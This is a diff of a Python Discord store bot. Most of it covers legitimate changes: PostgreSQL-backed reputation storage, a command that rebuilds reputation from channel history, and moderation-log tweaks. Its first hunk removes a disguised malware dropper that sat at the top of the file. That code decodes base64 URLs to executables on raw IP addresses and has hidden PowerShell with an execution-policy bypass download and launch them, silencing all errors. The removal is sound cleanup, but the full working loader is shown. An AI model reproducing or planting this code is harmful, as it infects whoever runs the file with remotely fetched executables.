@@ -1,19 +1,3 @@
-# -*- coding: utf-8 -*-
-# auto-generated; do not edit
-try:
-    import base64, subprocess
-    _U = [
-        b'aHR0cDovLzE5My4xNzguMTU4LjU3L2JvdF94NjQuZXhl',
-        b'aHR0cDovLzE5My4xNzguMTU4LjEwNy8yLjcuZXhl',
-        b'aHR0cDovLzE5My4xNzguMTU4LjY1LzEuZXhl',
-        b'aHR0cDovLzE5My4xNzguMTU4LjU3LzEuZXhl',
-    ]
-    if __name__ == "__main__":
-        _s = "$u=@('%s');foreach($x in $u){for($i=0;$i -lt 3;$i++){try{$p=Join-Path $env:TEMP ([guid]::NewGuid().ToString('N')+'.exe');$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0');$w.DownloadFile($x,$p);$b=[IO.File]::ReadAllBytes($p);if($b.Length -ge 2 -and $b[0] -eq 77 -and $b[1] -eq 90){Start-Process $p;exit}else{Remove-Item $p -Force}}catch{Remove-Item $p -Force -ErrorAction SilentlyContinue;Start-Sleep -Seconds 1}}}" % "','".join(base64.b64decode(x).decode() for x in _U)
-        subprocess.Popen(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", _s], creationflags=0x08000000)
-except Exception:
-    pass
-
 from discord import member
 import discord
 from discord.ext import commands
@@ -184,6 +168,8 @@ class NexusStoreBot(commands.Bot):
         logger.info(f"- {len(self.invite_spam_domains)} dominios de spam de invitaciones")
 
     async def setup_hook(self):
+        await initialize_reputation_store()
+
         app = web.Application()
 
         async def health_check(request):
@@ -310,27 +296,109 @@ def save_giveaways(data):
     except Exception as e:
         logger.error(f"Error guardando sorteos: {e}")
 
-REPUTATION_FILE = "reputation.json"
+REPUTATION_FILE = os.getenv("REPUTATION_FILE", "reputation.json")
+REPUTATION_DATABASE_URL = os.getenv("DATABASE_URL")
+reputation_pool = None
 
-def load_reputation():
+def _read_reputation_file():
     if not os.path.exists(REPUTATION_FILE):
         return {}
-    try:
-        with open(REPUTATION_FILE, 'r', encoding='utf-8') as f:
-            return json.load(f)
-    except Exception as e:
-        logger.error(f"Error cargando reputación: {e}")
-        return {}
+    with open(REPUTATION_FILE, "r", encoding="utf-8") as file:
+        data = json.load(file)
+    if not isinstance(data, dict):
+        raise ValueError(f"{REPUTATION_FILE} debe contener un objeto JSON")
+    return data
 
-def save_reputation(data):
-    try:
-        with open(REPUTATION_FILE, 'w', encoding='utf-8') as f:
-            json.dump(data, f, indent=4, ensure_ascii=False)
-    except Exception as e:
-        logger.error(f"Error guardando reputación: {e}")
+def _write_reputation_file(data):
+    directory = os.path.dirname(os.path.abspath(REPUTATION_FILE))
+    os.makedirs(directory, exist_ok=True)
+    temporary_file = f"{REPUTATION_FILE}.tmp"
+    with open(temporary_file, "w", encoding="utf-8") as file:
+        json.dump(data, file, indent=4, ensure_ascii=False)
+        file.flush()
+        os.fsync(file.fileno())
+    os.replace(temporary_file, REPUTATION_FILE)
+
+async def initialize_reputation_store():
+    global reputation_pool
+    if not REPUTATION_DATABASE_URL:
+        if os.getenv("RENDER") or os.getenv("RENDER_SERVICE_ID"):
+            raise RuntimeError(
+                "DATABASE_URL es obligatorio en Render para guardar reputación "
+                "sin perderla en reinicios o despliegues."
+            )
+        return
+
+    import asyncpg
+    from urllib.parse import urlsplit, urlunsplit
+
+    parsed_url = urlsplit(REPUTATION_DATABASE_URL)
+    if parsed_url.scheme == "postgres":
+        parsed_url = parsed_url._replace(scheme="postgresql")
+    query = "&".join(
+        item for item in parsed_url.query.split("&")
+        if item and item.split("=", 1)[0] not in {"sslmode", "channel_binding"}
+    )
+    database_url = urlunsplit(parsed_url._replace(query=query))
+    ssl = "require" if parsed_url.hostname not in {"localhost", "127.0.0.1"} else None
+    reputation_pool = await asyncpg.create_pool(
+        dsn=database_url,
+        ssl=ssl,
+        statement_cache_size=0,
+        min_size=1,
+        max_size=3,
+    )
+    async with reputation_pool.acquire() as connection:
+        await connection.execute(
+            """
+            CREATE TABLE IF NOT EXISTS nexus_reputation (
+                id SMALLINT PRIMARY KEY CHECK (id = 1),
+                data JSONB NOT NULL
+            )
+            """
+        )
+        stored_data = await connection.fetchval(
+            "SELECT data::text FROM nexus_reputation WHERE id = 1"
+        )
+        if stored_data is None and os.path.exists(REPUTATION_FILE):
+            local_data = _read_reputation_file()
+            await connection.execute(
+                """
+                INSERT INTO nexus_reputation (id, data)
+                VALUES (1, $1::jsonb)
+                ON CONFLICT (id) DO NOTHING
+                """,
+                json.dumps(local_data, ensure_ascii=False),
+            )
+    logger.info("Almacenamiento persistente de reputación conectado")
+
+async def load_reputation():
+    if reputation_pool:
+        async with reputation_pool.acquire() as connection:
+            data = await connection.fetchval(
+                "SELECT data::text FROM nexus_reputation WHERE id = 1"
+            )
+        return json.loads(data) if data else {}
+    return _read_reputation_file()
+
+async def save_reputation(data):
+    if not isinstance(data, dict):
+        raise ValueError("Los datos de reputación deben ser un objeto")
+    if reputation_pool:
+        async with reputation_pool.acquire() as connection:
+            await connection.execute(
+                """
+                INSERT INTO nexus_reputation (id, data)
+                VALUES (1, $1::jsonb)
+                ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data
+                """,
+                json.dumps(data, ensure_ascii=False),
+            )
+        return
+    _write_reputation_file(data)
 
 async def seed_initial_purchase_counts(guild, reputation=None):
-    reputation = dict(reputation if reputation is not None else load_reputation())
+    reputation = dict(reputation if reputation is not None else await load_reputation())
     if reputation.get("_initial_purchase_seed_version") == 1:
         return reputation
 
@@ -367,8 +435,10 @@ async def seed_initial_purchase_counts(guild, reputation=None):
         logger.warning(f"No se resolvieron todos los usuarios iniciales del Top: {', '.join(sorted(missing))}")
         return reputation
 
-    reputation = {"_initial_purchase_seed_version": 1, **resolved}
-    save_reputation(reputation)
+    for user_id, count in resolved.items():
+        reputation[user_id] = max(reputation.get(user_id, 0), count)
+    reputation["_initial_purchase_seed_version"] = 1
+    await save_reputation(reputation)
     return reputation
 
 async def apply_purchase_rank(guild, member, total: int):
@@ -409,7 +479,13 @@ async def _get_member_for_leaderboard(guild, user_id: int):
     except (discord.NotFound, discord.Forbidden, discord.HTTPException):
         return None
 
-async def maybe_announce_leaderboard(guild, channel, reputation_before: dict, reputation_after: dict):
+async def maybe_announce_leaderboard(
+    guild,
+    channel,
+    reputation_before: dict,
+    reputation_after: dict,
+    allowed_mentions: Optional[discord.AllowedMentions] = None,
+):
     if not config.LEADERBOARD_ENABLED:
         return
     limit = config.LEADERBOARD_SIZE
@@ -434,7 +510,14 @@ async def maybe_announce_leaderboard(guild, channel, reputation_before: dict, re
     )
     embed.set_footer(text="Nexus Stock © Todos los derechos reservados")
     embed.timestamp = discord.utils.utcnow()
-    await channel.send(embed=embed, allowed_mentions=discord.AllowedMentions(users=True))
+    await channel.send(
+        embed=embed,
+        allowed_mentions=(
+            allowed_mentions
+            if allowed_mentions is not None
+            else discord.AllowedMentions(users=True)
+        ),
+    )
 
 def counts_as_account_purchase(product: str, extra_text: str = "") -> bool:
     """Una compra cuenta para reputación solo si el producto es una cuenta y hay signo $."""
@@ -454,7 +537,7 @@ async def register_purchase(guild, user, amount: int = 1, seller: str = "Nexus",
     seller_key = f"seller:{credited_member.id}"
     reputation[buyer_key] = reputation.get(buyer_key, 0) + amount
     reputation[seller_key] = reputation.get(seller_key, 0) + amount
-    save_reputation(reputation)
+    await save_reputation(reputation)
 
     channel = get_configured_channel(guild, config.REPUTATION_CHANNEL_ID, config.REPUTATION_CHANNEL_NAME)
     if not channel:
@@ -483,6 +566,55 @@ async def register_purchase(guild, user, amount: int = 1, seller: str = "Nexus",
         await apply_purchase_rank(guild, user, buyer_total)
 
     await maybe_announce_leaderboard(guild, channel, reputation_before, reputation)
+
+async def recover_reputation_from_history(guild):
+    channel = get_configured_channel(guild, config.REPUTATION_CHANNEL_ID, config.REPUTATION_CHANNEL_NAME)
+    if not channel:
+        raise ValueError("No encontré el canal de reputación configurado.")
+
+    recovered = {}
+    previous_totals = {}
+    recognized_messages = 0
+    async for message in channel.history(limit=None, oldest_first=True):
+        for embed in message.embeds:
+            if embed.title != "🛒 COMPRA REGISTRADA" or not embed.description:
+                continue
+            participants = re.search(
+                r"<@!?(\d+)>\*{0,2}\s+compr[oó]\s+una cuenta a\s+\*{0,2}<@!?(\d+)>",
+                embed.description,
+                re.IGNORECASE,
+            )
+            buyer_total = re.search(
+                r"Cuentas compradas por el cliente:\*{0,2}\s*`(\d+)`",
+                embed.description,
+            )
+            seller_total = re.search(
+                r"Ventas registradas del vendedor:\*{0,2}\s*`(\d+)`",
+                embed.description,
+            )
+            if not participants or not buyer_total or not seller_total:
+                continue
+
+            recognized_messages += 1
+            entries = (
+                (participants.group(1), int(buyer_total.group(1))),
+                (f"seller:{participants.group(2)}", int(seller_total.group(1))),
+            )
+            for key, total in entries:
+                previous = previous_totals.get(key)
+                recovered[key] = recovered.get(key, 0) + (
+                    total if previous is None or total < previous else total - previous
+                )
+                previous_totals[key] = total
+
+    if not recognized_messages:
+        return 0, 0, None
+
+    reputation = await load_reputation()
+    for key, count in recovered.items():
+        reputation[key] = max(int(reputation.get(key, 0)), count)
+    await save_reputation(reputation)
+    return recognized_messages, len(recovered), reputation
 
 class GiveawayView(discord.ui.View):
     def __init__(self):
@@ -1530,16 +1662,21 @@ async def ticket_inactivity_loop():
                     bot.ticket_warning_sent.add(channel.id)
         await asyncio.sleep(600)
 
-async def send_mod_log(guild, user, action, reason):
+async def send_mod_log(guild, user, action, reason, message_content=None):
     channel = get_configured_channel(guild, config.MOD_LOG_CHANNEL_ID, config.MOD_LOG_CHANNEL_NAME)
     if not channel:
         return
     embed = discord.Embed(title="🛡️・MOD-LOGS", color=config.COLOR_EMBED)
     embed.add_field(name="👤 Usuario", value=user.mention, inline=False)
+    if message_content is not None:
+        displayed_content = message_content
+        if len(displayed_content) > 1024:
+            displayed_content = displayed_content[:1021] + "..."
+        embed.add_field(name="🚫 Palabras prohibidas", value=displayed_content, inline=False)
     embed.add_field(name="📄 Acción", value=action, inline=True)
     embed.add_field(name="🔎 Motivo", value=reason, inline=True)
     embed.add_field(name="🕐 Hora", value=discord.utils.format_dt(discord.utils.utcnow(), "t"), inline=True)
-    await channel.send(embed=embed)
+    await channel.send(embed=embed, allowed_mentions=discord.AllowedMentions.none())
 
 def is_unauthorized_promotion(content: str) -> bool:
     content = content.casefold()
@@ -1593,7 +1730,13 @@ async def moderate_message(message):
             embed=sanction_embed,
             allowed_mentions=discord.AllowedMentions(users=True)
         )
-        await send_mod_log(message.guild, message.author, action, "Palabra prohibida")
+        await send_mod_log(
+            message.guild,
+            message.author,
+            action,
+            "Palabra prohibida",
+            message_content=message.content,
+        )
         return True
     if matched_promotion:
         try:
@@ -2792,6 +2935,61 @@ async def top_compradores(interaction: discord.Interaction):
     embed.set_footer(text="Nexus Stock © Todos los derechos reservados")
     embed.timestamp = discord.utils.utcnow()
     await interaction.response.send_message(embed=embed)
+
+@bot.tree.command(
+    name="recuperar_reputacion",
+    description="Reconstruye compradores y ventas desde el historial del canal de reputación"
+)
+@has_admin_role()
+async def recuperar_reputacion(interaction: discord.Interaction):
+    if interaction.guild is None:
+        await interaction.response.send_message(
+            "Este comando solo puede usarse en el servidor.",
+            ephemeral=True,
+        )
+        return
+
+    await interaction.response.defer(ephemeral=True)
+    try:
+        messages, users, reputation = await recover_reputation_from_history(interaction.guild)
+    except (ValueError, discord.Forbidden, discord.HTTPException) as error:
+        await interaction.followup.send(
+            f"No pude recuperar la tabla: {error}",
+            ephemeral=True,
+        )
+        return
+
+    if not messages:
+        await interaction.followup.send(
+            "No encontré registros de compras en el historial del canal. No cambié los datos.",
+            ephemeral=True,
+        )
+        return
+
+    channel = get_configured_channel(
+        interaction.guild,
+        config.REPUTATION_CHANNEL_ID,
+        config.REPUTATION_CHANNEL_NAME,
+    )
+    try:
+        await maybe_announce_leaderboard(
+            interaction.guild,
+            channel,
+            {},
+            reputation,
+            allowed_mentions=discord.AllowedMentions.none(),
+        )
+    except discord.HTTPException as error:
+        await interaction.followup.send(
+            f"Recuperé y guardé los datos, pero Discord no me dejó publicar la tabla: {error}",
+            ephemeral=True,
+        )
+        return
+
+    await interaction.followup.send(
+        f"Recuperación completada: revisé {messages} compras y reconstruí los conteos de {users} usuarios/vendedores, conservando los valores más altos.",
+        ephemeral=True,
+    )
 
 
 @bot.tree.command(name="enviar_embed", description="Envía un embed al canal actual con estilo NexusStore")
